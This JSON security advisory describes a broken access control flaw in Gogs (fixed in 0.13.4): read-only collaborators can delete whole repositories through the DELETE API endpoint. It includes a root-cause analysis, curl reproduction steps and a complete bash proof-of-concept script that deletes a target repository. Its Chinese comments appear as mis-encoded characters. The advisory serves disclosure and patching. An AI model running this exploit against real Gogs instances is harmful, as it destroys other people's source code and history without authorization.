{
  "schema_version": "1.4.0",
  "id": "GHSA-rjv5-9px2-fqw6",
  "modified": "2026-02-06T19:47:26Z",
  "published": "2026-02-06T19:47:26Z",
  "aliases": [
    "CVE-2025-65852"
  ],
  "summary": "Gogs has authorization bypass in repository deletion API",
  "details": "### Summary\n\nThe DELETE /api/v1/repos/:owner/:repo endpoint lacks necessary permission validation middleware. Consequently, any user with read access (including read-only collaborators) can delete the entire repository.\n\nThis vulnerability stems from the API route configuration only utilizing the repoAssignment() middleware (which only verifies read access) without enforcing reqRepoOwner() or reqRepoAdmin().\n\n### Details\n0. vulnerability location:\n\n- Vulnerable Endpointï¼šDELETE /api/v1/repos/:owner/:repo\n- Routing configuration file: internal/route/api/v1/api.go (approximately line 253)\n- Function handling file: internal/route/api/v1/repo/repo.go (approximately lines 320-338)\n\n1. Root Cause Analysis\n\nCode Location 1: API Route Configuration (internal/route/api/v1/api.go ~ line 253)\n\n```go\n// å½“å‰çš„è·¯ç”±é…ç½®ï¼ˆå­˜åœ¨æ¼æ´ï¼‰\nm.Delete(\"\", repo.Delete)  // ä»…ç»§æ‰¿äº†å¤–å±‚çš„ repoAssignment() ä¸­é—´ä»¶\n```\n\nCode Location 2: Delete Function Implementation (internal/route/api/v1/repo/repo.go ~ lines 320-338)\n```go\n// Delete å‡½æ•°å†…éƒ¨æ²¡æœ‰é¢å¤–çš„æƒé™æ£€æŸ¥\nfunc Delete(c *context.APIContext) {\n    // ç›´æ¥æ‰§è¡Œåˆ é™¤æ“ä½œï¼ŒæœªéªŒè¯ç”¨æˆ·æ˜¯å¦ä¸ºæ‰€æœ‰è€…\n    if err := models.DeleteRepository(c.User.ID, c.Repo.Repository.ID); err != nil {\n        c.Error(500, \"DeleteRepository\", err)\n        return\n    }\n    c.Status(204)\n}\n```\n\n2. Missing Permission Check\nComparison with route configurations for other sensitive operations:\n\n```go\n// Webhooks ç®¡ç†ï¼ˆæ­£ç¡®å®ç°ï¼‰\nm.Group(\"/hooks\", func() {\n    m.Combo(\"\").\n        Get(repo.ListHooks).\n        Post(bind(api.CreateHookOption{}), repo.CreateHook)\n}, reqRepoAdmin())  // âœ… ä½¿ç”¨äº†æƒé™ä¸­é—´ä»¶\n\n// éƒ¨ç½²å¯†é’¥ç®¡ç†ï¼ˆæ­£ç¡®å®ç°ï¼‰\nm.Group(\"/keys\", func() {\n    m.Combo(\"\").\n        Get(repo.ListDeployKeys).\n        Post(bind(api.CreateKeyOption{}), repo.CreateDeployKey)\n}, reqRepoAdmin())  // âœ… ä½¿ç”¨äº†æƒé™ä¸­é—´ä»¶\n\n// åˆ é™¤ä»“åº“ï¼ˆæ¼æ´ï¼‰\nm.Delete(\"\", repo.Delete)  // âŒ æ²¡æœ‰ä½¿ç”¨æƒé™ä¸­é—´ä»¶\n```\n3. Data Flow Path\n\n- API Request Path: DELETE /api/v1/repos/:owner/:repo\n- Route Handling: The outer middleware repoAssignment() verifies that the user has read access (Passed).\n- Execution: The system directly executes the repo.Delete() function.\n- Permission Check: The reqRepoOwner() middleware check is missing.\n- Internal Validation: There is no permission validation inside the Delete() function either.\n- Result: Any user with read permission can delete the repository.\n\n\n### PoC\n\nPrerequisites\n\n- A running Gogs instance.\n- The attacker's account is added as a collaborator to the target repository (Read access is sufficient).\n- The attacker possesses a valid API access token.\n- The target repository exists and is accessible.\n\nğŸ“œ Test Steps (Bash)\n\n1. Verify Gogs service is running\ncurl -I http://localhost:10880\n\n2. Create test accounts and repository\n- Owner account: owner / owner123456\n- Read-only account: victim / victim123456\n- Test repository: owner/delete-test\n<img width=\"1580\" height=\"832\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d1babac8-d952-4765-ba34-d4891c12b8db\" />\n\n\n3. Add 'victim' as a read-only collaborator\nPerform this via the Web UI or API\n<img width=\"1597\" height=\"725\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f76db1d4-9e45-4a97-af22-50db124ec4d0\" />\n<img width=\"1597\" height=\"760\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f6ef3bd9-47d4-4202-bf10-2022be557f16\" />\n\n\n\n4. Obtain API token for 'victim'\ncurl -X POST http://localhost:10880/api/v1/users/victim/tokens \\\n  -u victim:victim123456 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"test-token\"}'\n\n5. Resource deleted\n<img width=\"1602\" height=\"483\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e77aaaa-ffbc-4521-be4b-9a62f36499ff\" />\nWeb UIï¼šTarget repository deletion successful\n<img width=\"1581\" height=\"853\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fbd6b4a4-c874-44f9-9b6e-765371eddcc7\" />\n\n\nğŸ“œ PoC Script\n\n```bash\n#!/bin/bash\n# Gogs ä»“åº“åˆ é™¤æˆæƒç»•è¿‡æ¼æ´ PoC\n\n# ============ é…ç½®ä¿¡æ¯ ============\nGOGS_URL=\"http://localhost:10880\"\nTARGET_REPO=\"owner/delete-test\"\nVICTIM_TOKEN=\"your_victim_read_only_token_here\"\n\n# ============ æ‰§è¡Œæ”»å‡» ============\necho \"========================================\"\necho \"Gogs ä»“åº“åˆ é™¤æˆæƒç»•è¿‡æ¼æ´ PoC\"\necho \"========================================\"\necho \"\"\necho \"ç›®æ ‡ä»“åº“: $TARGET_REPO\"\necho \"æ”»å‡»è€…æƒé™: Readï¼ˆåªè¯»ï¼‰\"\necho \"é¢„æœŸè¡Œä¸º: 403 Forbiddenï¼ˆåº”è¯¥è¢«æ‹’ç»ï¼‰\"\necho \"\"\n\n# æ­¥éª¤1ï¼šéªŒè¯ä»“åº“å­˜åœ¨\necho \"[æ­¥éª¤1] éªŒè¯ç›®æ ‡ä»“åº“å­˜åœ¨...\"\nREPO_CHECK=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n\nif [ \"$REPO_CHECK\" == \"200\" ]; then\n    echo \"âœ“ ä»“åº“å­˜åœ¨ä¸”å¯è®¿é—®\"\nelse\n    echo \"âœ— ä»“åº“ä¸å­˜åœ¨æˆ–æ— æƒè®¿é—® (çŠ¶æ€ç : $REPO_CHECK)\"\n    exit 1\nfi\n\n# æ­¥éª¤2ï¼šå°è¯•åˆ é™¤ä»“åº“ï¼ˆæ¼æ´åˆ©ç”¨ï¼‰\necho \"\"\necho \"[æ­¥éª¤2] ä½¿ç”¨åªè¯»æƒé™å°è¯•åˆ é™¤ä»“åº“...\"\nDELETE_RESPONSE=$(curl -s -w \"\\nHTTP_CODE:%{http_code}\" \\\n  -X DELETE \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n\nDELETE_CODE=$(echo \"$DELETE_RESPONSE\" | grep \"HTTP_CODE:\" | cut -d: -f2)\n\necho \"å®é™…çŠ¶æ€ç : $DELETE_CODE\"\necho \"\"\n\n# æ­¥éª¤3ï¼šéªŒè¯ç»“æœ\nif [ \"$DELETE_CODE\" == \"204\" ] || [ \"$DELETE_CODE\" == \"200\" ]; then\n    echo \"========================================\"\n    echo \"ğŸ”´ æ¼æ´ç¡®è®¤ï¼šåˆ é™¤æˆåŠŸï¼\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"åªè¯»æƒé™ç”¨æˆ·æˆåŠŸåˆ é™¤äº†ä»“åº“ï¼\"\n    echo \"\"\n    \n    # éªŒè¯ä»“åº“æ˜¯å¦çœŸçš„è¢«åˆ é™¤\n    sleep 2\n    echo \"éªŒè¯ä»“åº“æ˜¯å¦çœŸçš„è¢«åˆ é™¤...\"\n    VERIFY_CHECK=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n      -H \"Authorization: token $VICTIM_TOKEN\" \\\n      \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n    \n    if [ \"$VERIFY_CHECK\" == \"404\" ]; then\n        echo \"âœ— ä»“åº“å·²è¢«å®Œå…¨åˆ é™¤ï¼ˆ404 Not Foundï¼‰\"\n        echo \"\"\n        echo \"å±å®³ç¡®è®¤ï¼š\"\n        echo \"  - ä»“åº“åŠæ‰€æœ‰æ•°æ®æ°¸ä¹…ä¸¢å¤±\"\n        echo \"  - ä»£ç å†å²è®°å½•ä¸å¯æ¢å¤\"\n        echo \"  - è¿™æ˜¯ä¸€ä¸ª HIGH çº§åˆ«çš„ä¸¥é‡æ¼æ´\"\n    else\n        echo \"? ä»“åº“çŠ¶æ€æœªçŸ¥ (çŠ¶æ€ç : $VERIFY_CHECK)\"\n    fi\n    \nelif [ \"$DELETE_CODE\" == \"403\" ]; then\n    echo \"========================================\"\n    echo \"âœ… æ— æ¼æ´ï¼šæ“ä½œè¢«æ­£ç¡®æ‹’ç»\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"åªè¯»æƒé™ç”¨æˆ·æ— æ³•åˆ é™¤ä»“åº“ï¼Œæƒé™æ£€æŸ¥æ­£å¸¸\"\n    \nelse\n    echo \"========================================\"\n    echo \"âš ï¸  æœªé¢„æœŸçš„å“åº”\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"çŠ¶æ€ç : $DELETE_CODE\"\n    echo \"è¿™å¯èƒ½è¡¨ç¤º API ç«¯ç‚¹ä¸å­˜åœ¨æˆ–å…¶ä»–é”™è¯¯\"\nfi\n\necho \"\"\necho \"========================================\"\necho \"PoC æ‰§è¡Œå®Œæˆ\"\necho \"========================================\"\n```\n\n\n### Impact\nVulnerability Type: Broken Access Control (CWE-284)\n\nDescription: A critical authorization bypass vulnerability exists in the Gogs API. The access control mechanism fails to properly validate permissions for destructive operations.\n\nConsequences: An authenticated attacker with low-level privileges (e.g., a collaborator with Read-Only access) can exploit this vulnerability to issue unauthorized DELETE requests. This allows the attacker to permanently delete entire repositories, resulting in the immediate loss of all source code, git history, issues, and wiki documentation.\n\nSeverity: This vulnerability poses a critical risk to data integrity and availability, potentially leading to irreversible data loss and significant operational disruption for affected organizations.\n\nThe Core Risk: Privilege Escalation & Data Destruction The most critical aspect of this vulnerability is the violation of the Principle of Least Privilege. It allows a user with the lowest level of access (Read-Only) to execute the most destructive action possible (Delete).",
  "severity": [
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "gogs.io/gogs"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.13.4"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 0.13.3"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/gogs/gogs/security/advisories/GHSA-rjv5-9px2-fqw6"
    },
    {
      "type": "WEB",
      "url": "https://github.com/gogs/gogs/commit/961a79e8f9f2b3190ea804bcf635e4b43b123272"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/gogs/gogs"
    },
    {
      "type": "WEB",
      "url": "https://github.com/gogs/gogs/releases/tag/v0.13.4"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-284"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2026-02-06T19:47:26Z",
    "nvd_published_at": null
  }
}